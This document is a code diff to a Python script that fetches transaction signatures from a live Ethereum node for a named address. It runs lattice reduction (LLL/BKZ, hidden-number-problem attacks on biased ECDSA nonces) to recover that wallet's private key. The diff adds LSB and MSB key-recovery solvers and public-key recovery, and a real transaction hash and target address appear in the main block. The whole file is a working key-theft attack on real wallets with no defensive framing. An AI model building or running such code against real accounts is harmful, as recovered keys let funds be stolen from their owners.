@@ -7,8 +7,9 @@ from coincurve import PublicKey
 from eth_utils import keccak, to_bytes, to_checksum_address
 from eth_account._utils.legacy_transactions import Transaction
 from eth_keys import keys
-from sage.all import Matrix, ZZ, vector, QQ, RealField, RR, log
-from fpylll import IntegerMatrix, GSO, BKZ, LLL
+from Crypto.Hash import keccak as ckeccak
+from sage.all import Matrix, ZZ, vector, QQ, RealField, RR, log, EllipticCurve, GF, inverse_mod, Integer, power_mod
+from fpylll import IntegerMatrix, GSO, BKZ, LLL, FPLLL, Enumeration
 import cryptocheck
 
 # 1. Connect to an Ethereum Node (use your own RPC URL)
@@ -26,6 +27,9 @@ CONFIG = {
 N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
 # HALF_N = 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0
 HALF_N = N // 2
+p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f
+E = EllipticCurve(GF(p), [0, 7])
+G = E.gens()[0]
 
 w3 = Web3(Web3.HTTPProvider(CONFIG["RPC_URL"]))
 
@@ -46,6 +50,44 @@ def to_min_bytes(n):
     h = hex(n)[2:]
     if len(h) % 2: h = '0' + h
     return bytes.fromhex(h)
+
+def get_address_from_Q(Q):
+    """Converts a Sage point Q to an Ethereum address."""
+    x_hex = hex(Q[0])[2:].zfill(64)
+    y_hex = hex(Q[1])[2:].zfill(64)
+    pub_key_bytes = bytes.fromhex(x_hex + y_hex)
+    k = ckeccak.new(digest_bits=256)
+    k.update(pub_key_bytes)
+    return "0x" + k.hexdigest()[-40:]
+
+def get_Q(z, r, s, v):
+    v_norm = v - 27 if v >= 27 else v
+    x = Integer(r)
+    y_sq = (x**3 + 7) % p
+    y = power_mod(y_sq, (p + 1) // 4, p)
+    
+    # Adjust y based on v (27=even, 28=odd)
+    if y % 2 != v_norm:
+        y = p - y
+    R = E(x, y)
+    
+    # 2. Recover Public Key Q
+    r_inv = inverse_mod(Integer(r), N)
+    Q = r_inv * (Integer(s) * R - Integer(z) * G)
+    
+    # 3. Check Address
+    recovered_addr = get_address_from_Q(Q)
+    return recovered_addr
+
+def test_legacy_hash(tx_hash, address):
+    z_int, r_int, s_int, v_int = get_legacy_tx_values(tx_hash)
+    # z_int = int("0x2ed93f3503f16757434c4f305c742c070f3f2187f42d2a4501ba873322e1189c", 16)
+    if v_int == 28:
+        v_int = 27
+        s_int = N - s_int
+    result =  cryptocheck.verify_z(z_int, r_int, s_int, v_int, address)
+    # recovered_address = get_Q(z_int, r_int, s_int, v_int)
+    # print(recovered_address)
 
 def get_legacy_tx_values(tx_hash):
     # Fetch transaction data
@@ -107,6 +149,9 @@ def get_legacy_tx_values(tx_hash):
     # z_int = int(z_hash, 16)
     z_hash = keccak(unsigned_encoded)
     z_int = int.from_bytes(z_hash, byteorder='big')
+    # k = ckeccak.new(digest_bits=256)
+    # k.update(unsigned_encoded)
+    # print(k.hexdigest())
     print(z_int)
     print(f"Transaction: {tx_hash}")
     print(f"z (Message Hash): {z_hash.hex()}")
@@ -138,8 +183,9 @@ def is_simple_tx(tx_receipt):
     return clean_hex(tx_receipt['input']) == b''
 
 def is_pure_tx(tx_receipt):
+    limitBlockNumber = 1150000
     is_failed_tx = is_old_tx_failed(tx_receipt)
-    print(is_failed_tx)
+    # print(is_failed_tx)
     is_simpled_tx = is_simple_tx(tx_receipt)
     is_not_contract = True
     if 'contractAddress' in tx_receipt:
@@ -148,7 +194,7 @@ def is_pure_tx(tx_receipt):
     if 'gasUsed' in tx_receipt:
         if int(tx_receipt['gasUsed']) > 21000:
             is_not_contract = False
-    return not is_failed_tx and is_simpled_tx and is_not_contract
+    return not is_failed_tx and is_simpled_tx and is_not_contract and (int(tx_receipt['blockNumber']) < limitBlockNumber)
 
 def get_live_signatures(address):
     """Phase 1: Real-time Signature Harvesting"""
@@ -160,6 +206,7 @@ def get_live_signatures(address):
     zVerifiedCnt = 0
     sigs = []    
     vCnt = 0
+    sBigCnt = 0
     print(len(txs))
     leading_bias = 6
 
@@ -170,9 +217,9 @@ def get_live_signatures(address):
         # if len(sigs) >= 20:
         #     print("ok")
         #     break # Higher count recommended for EIP-1559
-        if len(sigs) >= 30:
+        if len(sigs) >= 150:
             break
-        print(tx_data)
+        # print(tx_data)
         tx = w3.eth.get_transaction(tx_data['hash'])
         
         # break
@@ -181,16 +228,19 @@ def get_live_signatures(address):
         # is_failed_tx = is_old_tx_failed(tx_data)
         # is_simpled_tx = is_simple_tx(tx_data)
         is_pured_tx = is_pure_tx(tx_data)
-        print(is_pured_tx)
+        # print(is_pured_tx)
         nonce = int(tx.get('nonce', 0))
         # if is_failed_tx == 1:
         #     print(tx_data)
         # if tx['from'].lower() == address.lower() and tx.get('type') == 0 and not is_failed_tx and is_simpled_tx and tx_data['blockNumber'] == '225930':
         # if tx['from'].lower() == address.lower() and tx.get('type') == 0 and is_pured_tx and nonce >= minRNonce:
         if tx['from'].lower() == address.lower() and tx.get('type') == 0 and is_pured_tx:
-            
+            print(tx_data)
             # print(nonce)
             z_int, r_int, s_int, v_int = get_legacy_tx_values(tx_data['hash'])
+            if s_int > N // 2:
+                print("Big-found")
+                sBigCnt += 1
             # if minRLength > len(hex(r_int)) - 2:
             #     minRLength = len(hex(r_int)) - 2
             #     minRNonce = int(tx_data['nonce'])
@@ -214,14 +264,16 @@ def get_live_signatures(address):
             #         rLists.append(hex(r_int))
             #         sigs.append((z_int, r_int, s_int, v_int))
     # estimate_bias(rLists)
-    print(vCnt)
+    print(f"vCnt->{vCnt} sBigCnt->{sBigCnt}")
     print(f"minRLength-{minRLength}, minRNonce-{minRNonce}")
     sigs = sorted(sigs, key=lambda x: int(x[1]))
 
     # is_uniqu_sigs(sigs)
     # solve_foundation_lattice(sigs, address)
     # solve_foundation_lattice_ZZ(sigs, address)
-    solve_foundation_lattice_advance_fyplll(sigs, address)
+    solve_lsb_foundation_perfect(sigs, address)
+    # solve_universal_msb(sigs, address)
+    # solve_foundation_lattice_advance_fyplll(sigs, address)
     # solve_foundation_lattice_ftplll(sigs, address)
     # solve_foundation_centered_lattice_ZZ(sigs, address)
     # solve_foundation_trailing_lattice_ZZ(sigs, address)
@@ -446,6 +498,234 @@ def solve_foundation_lattice(signatures, target_address):
     # print("[x] No key found. Check Z-hashes or increase Bias Bits.")
     return None
 
+def solve_lsb_foundation_perfect(sigs, target_address, lsb_bits=2):
+    """
+    Solves HNP for LSB leakage (k = 2^B * k' + 0).
+    sigs: list of (z, r, s)
+    lsb_bits: number of trailing zeros (e.g., 2 if k is always a multiple of 4)
+    """
+    normalized_sigs = []
+    for z, r, s, v in sigs:
+        # ONLY flip s if it is physically in the high range. 
+        # Do NOT flip z. The relationship s = k^-1(z + rd) handles the sign of k.
+        # if s >= HALF_N or v == 28:
+        if s >= HALF_N:
+        # if v == 28:
+            s_fixed = N - s
+        else:
+            s_fixed = s
+        normalized_sigs.append((z, r, s_fixed))
+
+    m = len(sigs)
+    # The multiplier for the LSB (2^bits)
+    A_lsb = pow(2, lsb_bits, N)
+    A_inv = pow(A_lsb, -1, N)
+    
+    # Target bound for the 'short' part of k
+    B = 2**(256 - lsb_bits)
+    scale = N // B
+    
+    L = Matrix(QQ, m + 2, m + 2)
+    print(f"[*] [06:23 PM] Constructing LSB Lattice for {m} signatures...")
+
+    for i, (z, r, s) in enumerate(normalized_sigs):
+        s_inv = pow(int(s), -1, N)
+        # For LSB, we transform the equation to isolate the 'short' k'
+        # k = s^-1(z + rd) -> (2^B)k' = s^-1(z + rd)
+        # k' = (2^B)^-1 * s^-1 * z + (2^B)^-1 * s^-1 * r * d
+        t_i = (int(r) * s_inv * A_inv) % N
+        u_i = (int(z) * s_inv * A_inv) % N
+        
+        L[i, i] = N * scale
+        L[m, i] = t_i * scale
+        L[m + 1, i] = (u_i - (B // 2)) * scale # Centering for better convergence
+
+    L[m, m] = 1
+    L[m + 1, m + 1] = B // 2
+
+    # 1. Cast and High Precision
+    A = IntegerMatrix.from_matrix(L.change_ring(ZZ))
+    FPLLL.set_precision(256)
+    
+    # 2. GSO & LLL Pre-reduction
+    gso = GSO.Mat(A, float_type="mpfr")
+    gso.update_gso()
+    lll_obj = LLL.Reduction(gso)
+    lll_obj()
+
+    # 3. BKZ Reduction
+    print("[*] Starting LSB BKZ Reduction...")
+    # Initialize with 3 arguments: GSO, LLL, and initial Params
+    init_params = BKZ.Param(block_size=40, strategies=BKZ.DEFAULT_STRATEGY, flags=BKZ.VERBOSE)
+    bkz = BKZ.Reduction(gso, lll_obj, init_params)
+    bkz()
+
+    # for i in range(A.nrows):
+    #         potential_d = abs(int(A[i, m]))
+    #         # Verify if the found value is a valid private key (250-256 bits)
+    #         if potential_d > 1 and 250 < RR(log(max(1, potential_d), 2)) < 256.5:
+    #             # Double check with a known signature's ecrecover if needed
+    #             print(f"\n[!] SUCCESS! [06:23 PM]")
+    #             print(f"[!] Private Key: {hex(potential_d)}")
+    #             return potential_d
+            
+    for row_idx, row in enumerate(A):
+            # Monitor the length: if row[m] is < 150 bits, you likely won.
+            row_bits = int(abs(row[m])).bit_length()
+            
+            for target_col in [m, m + 1, m-1]:
+                d_base = abs(int(row[target_col])) % N
+                if d_base <= 1: continue
+
+                # Neighborhood search for rounding errors
+                for drift in range(-100, 101):
+                    d_cand = (d_base + drift) % N
+                    if multi_verify_address([d_cand, (N - d_cand) % N], target_address):                        
+                        found = True
+                        print(found)
+                        return
+                    
+            for i in range(m):
+                k_base = abs(int(row[i])) % N
+                if k_base <= 1: continue
+                
+                z, r, s = normalized_sigs[i]
+                r_inv = pow(r, -1, N)
+                
+                # Test variants including the "Fuzzer" for rounding drift
+                for drift in range(-100, 101):
+                    k_cand = (k_base + drift) % N
+                    d_candidates = [
+                        (s * k_cand - z) * r_inv % N,
+                        (s * k_cand + z) * r_inv % N,
+                        (s * (N - k_cand) - z) * r_inv % N,
+                        (s * (N - k_cand) + z) * r_inv % N
+                    ]
+                    if multi_verify_address(d_candidates, target_address):
+                        # print(f"\n[!!!] SUCCESS: Found via Nonce {i} in row {row_idx}")
+                        found = True
+                        print(found)
+                        return
+            
+    # for block in [60, 90, 110]:
+    #     print(f"    - Round: BKZ-{block}...")
+    #     params = BKZ.Param(block_size=block, strategies=BKZ.DEFAULT_STRATEGY, flags=BKZ.VERBOSE)
+    #     bkz(params)
+        
+    #     # Scan for the key
+    #     for i in range(A.nrows):
+    #         potential_d = abs(int(A[i, m]))
+    #         # Verify if the found value is a valid private key (250-256 bits)
+    #         if potential_d > 1 and 250 < RR(log(max(1, potential_d), 2)) < 256.5:
+    #             # Double check with a known signature's ecrecover if needed
+    #             print(f"\n[!] SUCCESS! [06:23 PM]")
+    #             print(f"[!] Private Key: {hex(potential_d)}")
+    #             return potential_d
+
+    print("[-] LSB Reduction complete. No key found.")
+    return None
+
+def solve_universal_msb(signatures, target_address, known_prefix=0):
+    normalized_sigs = []
+    for z, r, s, v in signatures:
+        # ONLY flip s if it is physically in the high range. 
+        # Do NOT flip z. The relationship s = k^-1(z + rd) handles the sign of k.
+        # if s >= HALF_N or v == 28:
+        # if s >= HALF_N:
+        if v == 28:
+            s_fixed = N - s
+        else:
+            s_fixed = s
+        normalized_sigs.append((z, r, s_fixed))
+
+    # 2. FIX THE WEIGHTING LOOP
+    # We test different 'B' weights to see which one makes the lattice 'snap'
+    # for bias_bits in range(8, 18, 1): 
+    for bias_bits in [128, 96, 2]: 
+        # B should be roughly 2^(256 - bias_bits) to balance the matrix
+        B = 2**(256 - bias_bits) 
+        m = len(normalized_sigs)
+
+        # Scaling factor: Balances large n with the target vector
+        # Crucial for dropping bit-length below 243
+        scale = N // B
+        
+        print(f"[*] [03:11 PM] Testing bias_bits: {bias_bits} (Weight B: 2^{256-bias_bits})")
+
+        L = Matrix(QQ, m + 2, m + 2)
+        for i in range(m):
+            z, r, s = normalized_sigs[i]
+            s_inv = pow(s, -1, N)
+            t_i = (r * s_inv) % N
+            u_i = (z * s_inv - (known_prefix << (256 - bias_bits))) % N
+            
+            L[i, i] = N * scale
+            L[m, i] = t_i * scale
+            L[m + 1, i] = (u_i - (B // 2)) * scale
+
+        L[m, m] = 1
+        L[m + 1, m + 1] = B // 2
+
+        # 1. Cast to IntegerMatrix and set global precision
+        A = IntegerMatrix.from_matrix(L.change_ring(ZZ))
+        FPLLL.set_precision(256)
+        
+        # 2. Setup GSO
+        gso = GSO.Mat(A, float_type="mpfr")
+        gso.update_gso()
+
+         # 3. INITIALIZE TRIPLE ARGUMENTS FOR BKZ.Reduction
+        # Argument 1: The GSO Object
+        # Argument 2: The LLL Object (Used for internal LLL tours)
+        # Argument 3: The Enumeration Object (Used for shortest vector search)
+        lll_obj = LLL.Reduction(gso)
+        # 3. FIX: Initialize BKZ with GSO, LLL, and a Param object
+        # We create a base parameter object to satisfy the constructor
+        base_params = BKZ.Param(block_size=40, strategies=BKZ.DEFAULT_STRATEGY, flags=BKZ.VERBOSE )
+        bkz_engine = BKZ.Reduction(gso, lll_obj, base_params)
+        # Execute using the reduction engine
+        bkz_engine()
+
+
+        for row_idx, row in enumerate(A):
+            # Monitor the length: if row[m] is < 150 bits, you likely won.
+            row_bits = int(abs(row[m-1])).bit_length()
+            print(row_bits, " ", RR(log(abs(row[m]), 2)))
+            # for target_col in [m, m + 1]:
+            #     d_base = abs(int(row[target_col])) % N
+            #     if d_base <= 1: continue
+
+            #     # Neighborhood search for rounding errors
+            #     for drift in range(-500, 501):
+            #         d_cand = (d_base + drift) % N
+            #         if multi_verify_address([d_cand, (N - d_cand) % N], target_address):                        
+            #             found = True
+            #             print(found)
+            #             return
+                    
+            # for i in range(m):
+            #     k_base = abs(int(row[i])) % N
+            #     if k_base <= 1: continue
+                
+            #     z, r, s = normalized_sigs[i]
+            #     r_inv = pow(r, -1, N)
+                
+            #     # Test variants including the "Fuzzer" for rounding drift
+            #     for drift in range(-500, 501):
+            #         k_cand = (k_base + drift) % N
+            #         d_candidates = [
+            #             (s * k_cand - z) * r_inv % N,
+            #             (s * k_cand + z) * r_inv % N,
+            #             (s * (N - k_cand) - z) * r_inv % N,
+            #             (s * (N - k_cand) + z) * r_inv % N
+            #         ]
+            #         if multi_verify_address(d_candidates, target_address):
+            #             # print(f"\n[!!!] SUCCESS: Found via Nonce {i} in row {row_idx}")
+            #             found = True
+            #             print(found)
+            #             return
+
+
 def solve_foundation_lattice_advance_fyplll(signatures, target_address):
     normalized_sigs = []
     for z, r, s, v in signatures:
@@ -498,65 +778,68 @@ def solve_foundation_lattice_advance_fyplll(signatures, target_address):
         # 4. THE PROGRESSIVE LADDER
         # Instead of jumping to BKZ-70, we 'temper' the lattice.
         # This prevents the basis from 'shattering' and ensures global minimum convergence.
-        for block_size in [40, 60, 85, 95]:
-            print(f"[*] [{block_size}] Reducing with block size {block_size}...")
-            # Use the Object-based solver (the 'M' method) for maximum stability
-            # solver = BKZ.Reduction(M)
-            par = BKZ.Param(block_size=block_size, 
-                        flags=BKZ.AUTO_ABORT | BKZ.GH_BND)
-            # solver(par)
-            # BKZ.reduction(M, par)
-            BKZ.reduction(A, par)
+        # for block_size in [40, 60, 85, 95]:
+        #     print(f"[*] [{block_size}] Reducing with block size {block_size}...")
+        #     # Use the Object-based solver (the 'M' method) for maximum stability
+        #     # solver = BKZ.Reduction(M)
+        #     par = BKZ.Param(block_size=block_size, 
+        #                 flags=BKZ.AUTO_ABORT | BKZ.GH_BND)
+        #     # solver(par)
+        #     # BKZ.reduction(M, par)
+        #     BKZ.reduction(A, par)
             
-            # Stability Check: Monitor the Gram-Schmidt norm
-            logger = M.get_r(m, m)
-            current_bits = RR(log(M.get_r(m, m), 2)) / 2
-            print(f"First row[m]'s bits length-{int(logger).bit_length()}, {current_bits}")
-            if logger < 2**160: 
-                break
-
+        #     # Stability Check: Monitor the Gram-Schmidt norm
+        #     logger = M.get_r(m, m)
+        #     current_bits = RR(log(M.get_r(m, m), 2)) / 2
+        #     print(f"First row[m]'s bits length-{int(logger).bit_length()}, {current_bits}")
+        #     if logger < 2**160: 
+        #         break
         
-        # # 5. THE PERFECT RECOVERY (Multi-Column Check)
-        # L_reduced = A.to_matrix()
+        par = BKZ.Param(block_size=90, 
+                        flags=BKZ.AUTO_ABORT | BKZ.GH_BND)
+        BKZ.reduction(A, par)
+        
+        # 5. THE PERFECT RECOVERY (Multi-Column Check)
+        L_reduced = A.to_matrix(L)
 
-        # # 5. ROBUST RECOVERY
-        # for row_idx, row in enumerate(L_reduced):
-        #     # Monitor the length: if row[m] is < 150 bits, you likely won.
-        #     row_bits = int(abs(row[m])).bit_length()
+        # 5. ROBUST RECOVERY
+        for row_idx, row in enumerate(L_reduced):
+            # Monitor the length: if row[m] is < 150 bits, you likely won.
+            row_bits = int(abs(row[m])).bit_length()
             
-        #     for target_col in [m, m + 1]:
-        #         d_base = abs(int(row[target_col])) % N
-        #         if d_base <= 1: continue
+            for target_col in [m, m + 1]:
+                d_base = abs(int(row[target_col])) % N
+                if d_base <= 1: continue
 
-        #         # Neighborhood search for rounding errors
-        #         for drift in range(-500, 501):
-        #             d_cand = (d_base + drift) % N
-        #             if multi_verify_address([d_cand, (N - d_cand) % N], target_address):                        
-        #                 found = True
-        #                 print(found)
-        #                 return
+                # Neighborhood search for rounding errors
+                for drift in range(-500, 501):
+                    d_cand = (d_base + drift) % N
+                    if multi_verify_address([d_cand, (N - d_cand) % N], target_address):                        
+                        found = True
+                        print(found)
+                        return
                     
-        #     for i in range(m):
-        #         k_base = abs(int(row[i])) % N
-        #         if k_base <= 1: continue
+            for i in range(m):
+                k_base = abs(int(row[i])) % N
+                if k_base <= 1: continue
                 
-        #         z, r, s = normalized_sigs[i]
-        #         r_inv = pow(r, -1, N)
+                z, r, s = normalized_sigs[i]
+                r_inv = pow(r, -1, N)
                 
-        #         # Test variants including the "Fuzzer" for rounding drift
-        #         for drift in range(-500, 501):
-        #             k_cand = (k_base + drift) % N
-        #             d_candidates = [
-        #                 (s * k_cand - z) * r_inv % N,
-        #                 (s * k_cand + z) * r_inv % N,
-        #                 (s * (N - k_cand) - z) * r_inv % N,
-        #                 (s * (N - k_cand) + z) * r_inv % N
-        #             ]
-        #             if multi_verify_address(d_candidates, target_address):
-        #                 # print(f"\n[!!!] SUCCESS: Found via Nonce {i} in row {row_idx}")
-        #                 found = True
-        #                 print(found)
-        #                 return
+                # Test variants including the "Fuzzer" for rounding drift
+                for drift in range(-500, 501):
+                    k_cand = (k_base + drift) % N
+                    d_candidates = [
+                        (s * k_cand - z) * r_inv % N,
+                        (s * k_cand + z) * r_inv % N,
+                        (s * (N - k_cand) - z) * r_inv % N,
+                        (s * (N - k_cand) + z) * r_inv % N
+                    ]
+                    if multi_verify_address(d_candidates, target_address):
+                        # print(f"\n[!!!] SUCCESS: Found via Nonce {i} in row {row_idx}")
+                        found = True
+                        print(found)
+                        return
 
 
 def solve_foundation_lattice_ftplll(signatures, target_address):
@@ -1142,6 +1425,7 @@ if __name__ == "__main__":
     hash1 = "0x6b4ffaf6c3bef140d4d081b5bd8146c91149418c0edbc11b5632a7d74c459f80" 
     # hash2 = "0x373b8f71941cb7c70e5bbcd7341acf7106e31f95254527c7d33c0ce98d320af5"
     # data1 = get_legacy_tx_values(hash1)
+    # test_legacy_hash(hash1, "0xC839EE5542b4E8413246b3634C5c739fEA949562")
     # data2 = get_legacy_tx_values(hash2)
     # arbcheck.solve_two_lattice(data1['z'], data1['r'], data1['s'], data2['z'], data2['r'], data2['s'])
     get_live_signatures(address)
